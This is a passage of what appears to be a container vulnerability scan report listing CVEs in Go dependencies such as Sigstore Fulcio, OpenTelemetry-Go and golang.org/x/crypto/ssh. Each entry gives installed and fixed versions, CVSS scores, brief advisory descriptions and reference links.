│     │      ├ VendorSeverity   ╭ ghsa  : 3 
│     │      │                  ╰ redhat: 2 
│     │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N 
│     │      │                  │        ╰ V3Score : 8.7 
│     │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:N 
│     │      │                           ╰ V3Score : 6.5 
│     │      ╰ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-49478 
│     │                         ├ [1]: https://github.com/sigstore/fulcio 
│     │                         ├ [2]: https://github.com/sigstore/fulcio/security/advisories/GHSA-f5mr-q85p-6hh6 
│     │                         ├ [3]: https://nvd.nist.gov/vuln/detail/CVE-2026-49478 
│     │                         ╰ [4]: https://www.cve.org/CVERecord?id=CVE-2026-49478 
│     ├ [8]  ╭ VulnerabilityID : CVE-2026-22772 
│     │      ├ VendorIDs        ─ [0]: GHSA-59jp-pj84-45mr 
│     │      ├ PkgID           : github.com/sigstore/fulcio@v1.7.1 
│     │      ├ PkgName         : github.com/sigstore/fulcio 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/sigstore/fulcio@v1.7.1 
│     │      │                  ╰ UID : b4b2df00ae799d52 
│     │      ├ InstalledVersion: v1.7.1 
│     │      ├ FixedVersion    : 1.8.5 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-22772 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:4942686f940c61fb5cea946cf740648ee8691ff312d89f9a925643fe359877a1 
│     │      ├ Title           : fulcio: Fulcio: Server-Side Request Forgery (SSRF) via unanchored regex in
│     │      │                   MetaIssuer URL validation 
│     │      ├ Description     : Fulcio is a certificate authority for issuing code signing certificates for an
│     │      │                    OpenID Connect (OIDC) identity. Prior to 1.8.5, Fulcio's metaRegex() function
│     │      │                    uses unanchored regex, allowing attackers to bypass MetaIssuer URL validation
│     │      │                    and trigger SSRF to arbitrary internal services. Since the SSRF only can
│     │      │                   trigger GET requests, the request cannot mutate state. The response from the
│     │      │                   GET request is not returned to the caller so data exfiltration is not
│     │      │                   possible. A malicious actor could attempt to probe an internal network through
│     │      │                    Blind SSRF. This vulnerability is fixed in 1.8.5. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ─ [0]: CWE-918 
│     │      ├ VendorSeverity   ╭ amazon: 2 
│     │      │                  ├ ghsa  : 2 
│     │      │                  ├ nvd   : 2 
│     │      │                  ╰ redhat: 2 
│     │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N 
│     │      │                  │        ╰ V3Score : 5.8 
│     │      │                  ├ nvd    ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N 
│     │      │                  │        ╰ V3Score : 5.3 
│     │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N 
│     │      │                           ╰ V3Score : 5.8 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-22772 
│     │      │                  ├ [1]: https://github.com/sigstore/fulcio 
│     │      │                  ├ [2]: https://github.com/sigstore/fulcio/commit/eaae2f2be56df9dea5f9b439ec81be
│     │      │                  │      dae4c0978d 
│     │      │                  ├ [3]: https://github.com/sigstore/fulcio/security/advisories/GHSA-59jp-pj84-45mr 
│     │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-22772 
│     │      │                  ╰ [5]: https://www.cve.org/CVERecord?id=CVE-2026-22772 
│     │      ├ PublishedDate   : 2026-01-12T21:15:59.457Z 
│     │      ╰ LastModifiedDate: 2026-06-17T10:20:23.913Z 
│     ├ [9]  ╭ VulnerabilityID : CVE-2026-24137 
│     │      ├ VendorIDs        ─ [0]: GHSA-fcv2-xgw5-pqxf 
│     │      ├ PkgID           : github.com/sigstore/sigstore@v1.9.5 
│     │      ├ PkgName         : github.com/sigstore/sigstore 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/sigstore/sigstore@v1.9.5 
│     │      │                  ╰ UID : 115044d87d9a2201 
│     │      ├ InstalledVersion: v1.9.5 
│     │      ├ FixedVersion    : 1.10.4 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-24137 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:450709a502d56741c15eaa7ccd28d17086661117254ae0f1bed72a75215f7626 
│     │      ├ Title           : github.com/sigstore/sigstore: sigstore legacy TUF client allows for arbitrary
│     │      │                   file writes with target cache path traversal 
│     │      ├ Description     : sigstore framework is a common go library shared across sigstore services and
│     │      │                   clients. In versions 1.10.3 and below, the legacy TUF client
│     │      │                   (pkg/tuf/client.go) supports caching target files to disk. It constructs a
│     │      │                   filesystem path by joining a cache base directory with a target name sourced
│     │      │                   from signed target metadata; however, it does not validate that the resulting
│     │      │                   path stays within the cache base directory. A malicious TUF repository can
│     │      │                   trigger arbitrary file overwriting, limited to the permissions that the
│     │      │                   calling process has. Note that this should only affect clients that are
│     │      │                   directly using the TUF client in sigstore/sigstore or are using an older
│     │      │                   version of Cosign. Public Sigstore deployment users are unaffected, as TUF
│     │      │                   metadata is validated by a quorum of trusted collaborators. This issue has
│     │      │                   been fixed in version 1.10.4. As a workaround, users can disable disk caching
│     │      │                   for the legacy client by setting SIGSTORE_NO_CACHE=true in the environment,
│     │      │                   migrate to https://github.com/sigstore/sigstore-go/tree/main/pkg/tuf, or
│     │      │                   upgrade to the latest sigstore/sigstore release. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ─ [0]: CWE-22 
│     │      ├ VendorSeverity   ╭ amazon: 2 
│     │      │                  ├ ghsa  : 2 
│     │      │                  ╰ redhat: 2 
│     │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:C/C:N/I:H/A:N 
│     │      │                  │        ╰ V3Score : 5.8 
│     │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:C/C:N/I:H/A:N 
│     │      │                           ╰ V3Score : 5.8 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-24137 
│     │      │                  ├ [1]: https://github.com/sigstore/sigstore 
│     │      │                  ├ [2]: https://github.com/sigstore/sigstore/commit/8ec410a2993ea78083aecf0e473a
│     │      │                  │      85453039496e 
│     │      │                  ├ [3]: https://github.com/sigstore/sigstore/releases/tag/v1.10.4 
│     │      │                  ├ [4]: https://github.com/sigstore/sigstore/security/advisories/GHSA-fcv2-xgw5-
│     │      │                  │      pqxf 
│     │      │                  ├ [5]: https://nvd.nist.gov/vuln/detail/CVE-2026-24137 
│     │      │                  ├ [6]: https://pkg.go.dev/vuln/GO-2026-4358 
│     │      │                  ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2026-24137 
│     │      ├ PublishedDate   : 2026-01-23T00:15:52.553Z 
│     │      ╰ LastModifiedDate: 2026-06-17T10:22:41.597Z 
│     ├ [10] ╭ VulnerabilityID : CVE-2026-29181 
│     │      ├ VendorIDs        ─ [0]: GHSA-mh2q-q3fh-2475 
│     │      ├ PkgID           : go.opentelemetry.io/otel@v1.39.0 
│     │      ├ PkgName         : go.opentelemetry.io/otel 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/go.opentelemetry.io/otel@v1.39.0 
│     │      │                  ╰ UID : e91343569f8d4149 
│     │      ├ InstalledVersion: v1.39.0 
│     │      ├ FixedVersion    : 1.41.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-29181 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:f7986fd250e3d08725bf0a33d077ceac2f1f974e3856d7f0a1d4b0591e1d9981 
│     │      ├ Title           : github.com/open-telemetry/opentelemetry-go: OpenTelemetry-Go: Denial of
│     │      │                   Service via crafted multi-value baggage headers 
│     │      ├ Description     : OpenTelemetry-Go is the Go implementation of OpenTelemetry. From 1.36.0 to
│     │      │                   1.40.0, multi-value baggage: header extraction parses each header field-value
│     │      │                   independently and aggregates members across values. This allows an attacker to
│     │      │                    amplify cpu and allocations by sending many baggage: header lines, even when
│     │      │                   each individual value is within the 8192-byte per-value parse limit. This
│     │      │                   vulnerability is fixed in 1.41.0. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-770 
│     │      ├ VendorSeverity   ╭ azure : 2 
│     │      │                  ├ ghsa  : 3 
│     │      │                  ├ photon: 3 
│     │      │                  ╰ redhat: 3 
│     │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                  │        ╰ V3Score : 7.5 
│     │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                           ╰ V3Score : 7.5 
│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:25271 
│     │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-29181 
│     │      │                  ├ [2] : https://bugzilla.redhat.com/show_bug.cgi?id=2456252 
│     │      │                  ├ [3] : https://github.com/open-telemetry/opentelemetry-go 
│     │      │                  ├ [4] : https://github.com/open-telemetry/opentelemetry-go/commit/aa1894e09e3fe
│     │      │                  │       66860c7885cb40f98901b35277f 
│     │      │                  ├ [5] : https://github.com/open-telemetry/opentelemetry-go/pull/7880 
│     │      │                  ├ [6] : https://github.com/open-telemetry/opentelemetry-go/releases/tag/v1.41.0 
│     │      │                  ├ [7] : https://github.com/open-telemetry/opentelemetry-go/security/advisories/
│     │      │                  │       GHSA-mh2q-q3fh-2475 
│     │      │                  ├ [8] : https://nvd.nist.gov/vuln/detail/CVE-2026-29181 
│     │      │                  ├ [9] : https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-29181
│     │      │                  │       .json 
│     │      │                  ╰ [10]: https://www.cve.org/CVERecord?id=CVE-2026-29181 
│     │      ├ PublishedDate   : 2026-04-07T21:17:16.003Z 
│     │      ╰ LastModifiedDate: 2026-07-24T23:10:00.563Z 
│     ├ [11] ╭ VulnerabilityID : CVE-2026-39828 
│     │      ├ VendorIDs        ─ [0]: GO-2026-5014 
│     │      ├ PkgID           : golang.org/x/crypto@v0.46.0 
│     │      ├ PkgName         : golang.org/x/crypto 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/crypto@v0.46.0 
│     │      │                  ╰ UID : 21d8a1373272a6c 
│     │      ├ InstalledVersion: v0.46.0 
│     │      ├ FixedVersion    : 0.52.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39828 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:5136288205bb2662093365312241587ef3f06fd842c9ecc66fbc3f2a140a477d 
│     │      ├ Title           : golang.org/x/crypto/ssh: golang.org/x/crypto/ssh: Unauthorized command
│     │      │                   execution via discarded SSH permissions 
│     │      ├ Description     : When an SSH server authentication callback returned PartialSuccessError with
│     │      │                   non-nil Permissions, those permissions were silently discarded, potentially
│     │      │                   dropping certificate restrictions such as force-command after a second factor
│     │      │                   succeeded. Returning non-nil Permissions with PartialSuccessError now results
│     │      │                   in a connection error. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ╭ [0]: CWE-295 
│     │      │                  ╰ [1]: CWE-281 
│     │      ├ VendorSeverity   ╭ amazon: 3 
│     │      │                  ├ azure : 2 
│     │      │                  ╰ redhat: 3 
│     │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H 
│     │      │                           ╰ V3Score : 8.8 
│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:26546 
│     │      │                  ├ [1] : https://access.redhat.com/errata/RHSA-2026:26547 
│     │      │                  ├ [2] : https://access.redhat.com/errata/RHSA-2026:36105 
│     │      │                  ├ [3] : https://access.redhat.com/errata/RHSA-2026:36167 
│     │      │                  ├ [4] : https://access.redhat.com/errata/RHSA-2026:36207 
│     │      │                  ├ [5] : https://access.redhat.com/errata/RHSA-2026:36319 
│     │      │                  ├ [6] : https://access.redhat.com/errata/RHSA-2026:36625 
│     │      │                  ├ [7] : https://access.redhat.com/errata/RHSA-2026:36648 
│     │      │                  ├ [8] : https://access.redhat.com/errata/RHSA-2026:36651 
│     │      │                  ├ [9] : https://access.redhat.com/errata/RHSA-2026:36796 
│     │      │                  ├ [10]: https://access.redhat.com/errata/RHSA-2026:36797 
│     │      │                  ├ [11]: https://access.redhat.com/errata/RHSA-2026:36808 
│     │      │                  ├ [12]: https://access.redhat.com/errata/RHSA-2026:37268 
│     │      │                  ├ [13]: https://access.redhat.com/errata/RHSA-2026:37271 
│     │      │                  ├ [14]: https://access.redhat.com/errata/RHSA-2026:37272 
│     │      │                  ├ [15]: https://access.redhat.com/errata/RHSA-2026:37278 
│     │      │                  ├ [16]: https://access.redhat.com/errata/RHSA-2026:37286 
│     │      │                  ├ [17]: https://access.redhat.com/errata/RHSA-2026:37296 
│     │      │                  ├ [18]: https://access.redhat.com/errata/RHSA-2026:37387 
│     │      │                  ├ [19]: https://access.redhat.com/errata/RHSA-2026:40118 
│     │      │                  ├ [20]: https://access.redhat.com/errata/RHSA-2026:40262 
│     │      │                  ├ [21]: https://access.redhat.com/errata/RHSA-2026:40945 
│     │      │                  ├ [22]: https://access.redhat.com/errata/RHSA-2026:40969 
│     │      │                  ├ [23]: https://access.redhat.com/errata/RHSA-2026:40972 
│     │      │                  ├ [24]: https://access.redhat.com/errata/RHSA-2026:40974 
│     │      │                  ├ [25]: https://access.redhat.com/errata/RHSA-2026:41019 
│     │      │                  ├ [26]: https://access.redhat.com/errata/RHSA-2026:41031 
│     │      │                  ├ [27]: https://access.redhat.com/errata/RHSA-2026:41036 
│     │      │                  ├ [28]: https://access.redhat.com/errata/RHSA-2026:41055 
│     │      │                  ├ [29]: https://access.redhat.com/errata/RHSA-2026:41066 
│     │      │                  ├ [30]: https://access.redhat.com/errata/RHSA-2026:42146 
│     │      │                  ├ [31]: https://access.redhat.com/errata/RHSA-2026:42796 
│     │      │                  ├ [32]: https://access.redhat.com/errata/RHSA-2026:43052 
│     │      │                  ├ [33]: https://access.redhat.com/errata/RHSA-2026:43692 
│     │      │                  ├ [34]: https://access.redhat.com/security/cve/CVE-2026-39828 
│     │      │                  ├ [35]: https://bugzilla.redhat.com/show_bug.cgi?id=2480687 
│     │      │                  ├ [36]: https://go.dev/cl/781621 
│     │      │                  ├ [37]: https://go.dev/issue/79562 
│     │      │                  ├ [38]: https://groups.google.com/g/golang-announce/c/a082jnz-LvI 
│     │      │                  ├ [39]: https://nvd.nist.gov/vuln/detail/CVE-2026-39828 
│     │      │                  ├ [40]: https://pkg.go.dev/vuln/GO-2026-5014 
│     │      │                  ├ [41]: https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-39828
│     │      │                  │       .json 
│     │      │                  ╰ [42]: https://www.cve.org/CVERecord?id=CVE-2026-39828 
│     │      ├ PublishedDate   : 2026-05-22T04:16:22.19Z 
│     │      ╰ LastModifiedDate: 2026-07-27T13:17:47.807Z 
│     ├ [12] ╭ VulnerabilityID : CVE-2026-39829 
│     │      ├ VendorIDs        ─ [0]: GO-2026-5018 
│     │      ├ PkgID           : golang.org/x/crypto@v0.46.0 
│     │      ├ PkgName         : golang.org/x/crypto 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/crypto@v0.46.0 
│     │      │                  ╰ UID : 21d8a1373272a6c 
│     │      ├ InstalledVersion: v0.46.0 
│     │      ├ FixedVersion    : 0.52.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39829 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:5b98f53edefdb9c272d9282005d061b88d72b9d0303bc721cbe8d9b04c1695aa 
│     │      ├ Title           : golang.org/x/crypto/ssh: golang.org/x/crypto/ssh: Denial of Service via
│     │      │                   crafted public key with excessive parameters 
│     │      ├ Description     : The RSA and DSA public key parsers did not enforce size limits on key
│     │      │                   parameters. A crafted public key with an excessively large modulus or DSA
│     │      │                   parameter could cause several minutes of CPU consumption during signature
│     │      │                   verification. This could be triggered by unauthenticated clients during public
│     │      │                    key authentication. RSA moduli are now limited to 8192 bits, and DSA
│     │      │                   parameters are validated per FIPS 186-2. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ╭ [0]: CWE-347 
│     │      │                  ╰ [1]: CWE-1284 
│     │      ├ VendorSeverity   ╭ alma       : 3 
│     │      │                  ├ amazon     : 3 
│     │      │                  ├ azure      : 3 
│     │      │                  ├ oracle-oval: 3 
│     │      │                  ├ redhat     : 3 
│     │      │                  ╰ rocky      : 3 
│     │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                           ╰ V3Score : 7.5 
│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:26546 
│     │      │                  ├ [1] : https://access.redhat.com/errata/RHSA-2026:26547 
│     │      │                  ├ [2] : https://access.redhat.com/errata/RHSA-2026:29455 
│     │      │                  ├ [3] : https://access.redhat.com/errata/RHSA-2026:35833 
│     │      │                  ├ [4] : https://access.redhat.com/errata/RHSA-2026:36199 
│     │      │                  ├ [5] : https://access.redhat.com/errata/RHSA-2026:36207 
│     │      │                  ├ [6] : https://access.redhat.com/errata/RHSA-2026:36319 
│     │      │                  ├ [7] : https://access.redhat.com/errata/RHSA-2026:36625 
│     │      │                  ├ [8] : https://access.redhat.com/errata/RHSA-2026:36648 
│     │      │                  ├ [9] : https://access.redhat.com/errata/RHSA-2026:36651 
│     │      │                  ├ [10]: https://access.redhat.com/errata/RHSA-2026:36796 
│     │      │                  ├ [11]: https://access.redhat.com/errata/RHSA-2026:36797 
│     │      │                  ├ [12]: https://access.redhat.com/errata/RHSA-2026:36808 
│     │      │                  ├ [13]: https://access.redhat.com/errata/RHSA-2026:36820 
│     │      │                  ├ [14]: https://access.redhat.com/errata/RHSA-2026:36883 
│     │      │                  ├ [15]: https://access.redhat.com/errata/RHSA-2026:37072 
│     │      │                  ├ [16]: https://access.redhat.com/errata/RHSA-2026:37123 
│     │      │                  ├ [17]: https://access.redhat.com/errata/RHSA-2026:37268 
│     │      │                  ├ [18]: https://access.redhat.com/errata/RHSA-2026:37271 
│     │      │                  ├ [19]: https://access.redhat.com/errata/RHSA-2026:37272 
│     │      │                  ├ [20]: https://access.redhat.com/errata/RHSA-2026:37278 
│     │      │                  ├ [21]: https://access.redhat.com/errata/RHSA-2026:37286 
│     │      │                  ├ [22]: https://access.redhat.com/errata/RHSA-2026:37296 
│     │      │                  ├ [23]: https://access.redhat.com/errata/RHSA-2026:37387 
│     │      │                  ├ [24]: https://access.redhat.com/errata/RHSA-2026:40118 
│     │      │                  ├ [25]: https://access.redhat.com/errata/RHSA-2026:40262 
│     │      │                  ├ [26]: https://access.redhat.com/errata/RHSA-2026:40945 
│     │      │                  ├ [27]: https://access.redhat.com/errata/RHSA-2026:40969 
│     │      │                  ├ [28]: https://access.redhat.com/errata/RHSA-2026:40972 
│     │      │                  ├ [29]: https://access.redhat.com/errata/RHSA-2026:40974 
│     │      │                  ├ [30]: https://access.redhat.com/errata/RHSA-2026:41019 
│     │      │                  ├ [31]: https://access.redhat.com/errata/RHSA-2026:41031 
│     │      │                  ├ [32]: https://access.redhat.com/errata/RHSA-2026:41036 
│     │      │                  ├ [33]: https://access.redhat.com/errata/RHSA-2026:41055 
│     │      │                  ├ [34]: https://access.redhat.com/errata/RHSA-2026:41066 
│     │      │                  ├ [35]: https://access.redhat.com/errata/RHSA-2026:42146 
│     │      │                  ├ [36]: https://access.redhat.com/errata/RHSA-2026:42796 
│     │      │                  ├ [37]: https://access.redhat.com/errata/RHSA-2026:43052 
│     │      │                  ├ [38]: https://access.redhat.com/errata/RHSA-2026:43692 
│     │      │                  ├ [39]: https://access.redhat.com/security/cve/CVE-2026-39829 
│     │      │                  ├ [40]: https://bugzilla.redhat.com/2480680 
│     │      │                  ├ [41]: https://bugzilla.redhat.com/2480681 
│     │      │                  ├ [42]: https://bugzilla.redhat.com/2480685 
│     │      │                  ├ [43]: https://bugzilla.redhat.com/2480688 
│     │      │                  ├ [44]: https://bugzilla.redhat.com/2480757 
│     │      │                  ├ [45]: https://bugzilla.redhat.com/2480761 
│     │      │                  ├ [46]: https://bugzilla.redhat.com/2493620 
│     │      │                  ├ [47]: https://bugzilla.redhat.com/show_bug.cgi?id=2455470 
│     │      │                  ├ [48]: https://bugzilla.redhat.com/show_bug.cgi?id=2480681 
│     │      │                  ├ [49]: https://bugzilla.redhat.com/show_bug.cgi?id=2480684 
│     │      │                  ├ [50]: https://bugzilla.redhat.com/show_bug.cgi?id=2480685 
│     │      │                  ├ [51]: https://bugzilla.redhat.com/show_bug.cgi?id=2480688 
│     │      │                  ├ [52]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-34986 
│     │      │                  ├ [53]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39829 
│     │      │                  ├ [54]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39830 
│     │      │                  ├ [55]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39832 
│     │      │                  ├ [56]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-42508 
│     │      │                  ├ [57]: https://errata.almalinux.org/9/ALSA-2026-37123.html 
│     │      │                  ├ [58]: https://errata.rockylinux.org/RLSA-2026:35833 
│     │      │                  ├ [59]: https://go.dev/cl/781641 
│     │      │                  ├ [60]: https://go.dev/cl/781661 
│     │      │                  ├ [61]: https://go.dev/issue/79565 
│     │      │                  ├ [62]: https://groups.google.com/g/golang-announce/c/a082jnz-LvI 
│     │      │                  ├ [63]: https://linux.oracle.com/cve/CVE-2026-39829.html 
│     │      │                  ├ [64]: https://linux.oracle.com/errata/ELSA-2026-37123.html 
│     │      │                  ├ [65]: https://nvd.nist.gov/vuln/detail/CVE-2026-39829 
│     │      │                  ├ [66]: https://pkg.go.dev/vuln/GO-2026-5018 
│     │      │                  ├ [67]: https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-39829
│     │      │                  │       .json 
│     │      │                  ╰ [68]: https://www.cve.org/CVERecord?id=CVE-2026-39829 
│     │      ├ PublishedDate   : 2026-05-22T04:16:22.31Z 
│     │      ╰ LastModifiedDate: 2026-07-27T13:17:48.977Z 
│     ├ [13] ╭ VulnerabilityID : CVE-2026-39830 
│     │      ├ VendorIDs        ─ [0]: GO-2026-5017 
│     │      ├ PkgID           : golang.org/x/crypto@v0.46.0 
│     │      ├ PkgName         : golang.org/x/crypto 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/crypto@v0.46.0 
│     │      │                  ╰ UID : 21d8a1373272a6c 
│     │      ├ InstalledVersion: v0.46.0 
│     │      ├ FixedVersion    : 0.52.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39830 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:6f5d00a2fd395fe1f5ad590e263aa0367ac6776e10b33ffe0dbc9c0bfe8612c5 
│     │      ├ Title           : golang.org/x/crypto/ssh: golang.org/x/crypto/ssh: Denial of Service via
│     │      │                   resource leak from unsolicited SSH responses 
│     │      ├ Description     : A malicious SSH peer could send unsolicited global request responses to fill
│     │      │                   an internal buffer, blocking the connection's read loop. The blocked goroutine
│     │      │                    could not be released by calling Close(), resulting in a resource leak per
│     │      │                   connection. Unsolicited global responses are now discarded. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ╭ [0]: CWE-119 
│     │      │                  ╰ [1]: CWE-772 
│     │      ├ VendorSeverity   ╭ alma       : 3 
│     │      │                  ├ amazon     : 3 
│     │      │                  ├ azure      : 3 
│     │      │                  ├ oracle-oval: 3 
│     │      │                  ├ redhat     : 3 
│     │      │                  ├ rocky      : 3 
│     │      │                  ╰ ubuntu     : 2 
│     │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                           ╰ V3Score : 7.5 
│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:29455 
│     │      │                  ├ [1] : https://access.redhat.com/errata/RHSA-2026:35833 
│     │      │                  ├ [2] : https://access.redhat.com/errata/RHSA-2026:36199 
│     │      │                  ├ [3] : https://access.redhat.com/errata/RHSA-2026:36207 
│     │      │                  ├ [4] : https://access.redhat.com/errata/RHSA-2026:36319 
│     │      │                  ├ [5] : https://access.redhat.com/errata/RHSA-2026:36625 
│     │      │                  ├ [6] : https://access.redhat.com/errata/RHSA-2026:36648 
│     │      │                  ├ [7] : https://access.redhat.com/errata/RHSA-2026:36651 
│     │      │                  ├ [8] : https://access.redhat.com/errata/RHSA-2026:36796 
│     │      │                  ├ [9] : https://access.redhat.com/errata/RHSA-2026:36797 
│     │      │                  ├ [10]: https://access.redhat.com/errata/RHSA-2026:36808 
│     │      │                  ├ [11]: https://access.redhat.com/errata/RHSA-2026:37072 
│     │      │                  ├ [12]: https://access.redhat.com/errata/RHSA-2026:37268 
│     │      │                  ├ [13]: https://access.redhat.com/errata/RHSA-2026:37271 
│     │      │                  ├ [14]: https://access.redhat.com/errata/RHSA-2026:37272 
│     │      │                  ├ [15]: https://access.redhat.com/errata/RHSA-2026:37275 
│     │      │                  ├ [16]: https://access.redhat.com/errata/RHSA-2026:37278 
│     │      │                  ├ [17]: https://access.redhat.com/errata/RHSA-2026:37286 
│     │      │                  ├ [18]: https://access.redhat.com/errata/RHSA-2026:37296 
│     │      │                  ├ [19]: https://access.redhat.com/errata/RHSA-2026:37387 
│     │      │                  ├ [20]: https://access.redhat.com/errata/RHSA-2026:40118 
│     │      │                  ├ [21]: https://access.redhat.com/errata/RHSA-2026:40262 
│     │      │                  ├ [22]: https://access.redhat.com/errata/RHSA-2026:40945 
│     │      │                  ├ [23]: https://access.redhat.com/errata/RHSA-2026:40969 
│     │      │                  ├ [24]: https://access.redhat.com/errata/RHSA-2026:40972 
│     │      │                  ├ [25]: https://access.redhat.com/errata/RHSA-2026:40974 
│     │      │                  ├ [26]: https://access.redhat.com/errata/RHSA-2026:41019 
│     │      │                  ├ [27]: https://access.redhat.com/errata/RHSA-2026:41031 
│     │      │                  ├ [28]: https://access.redhat.com/errata/RHSA-2026:41036 
│     │      │                  ├ [29]: https://access.redhat.com/errata/RHSA-2026:41066 
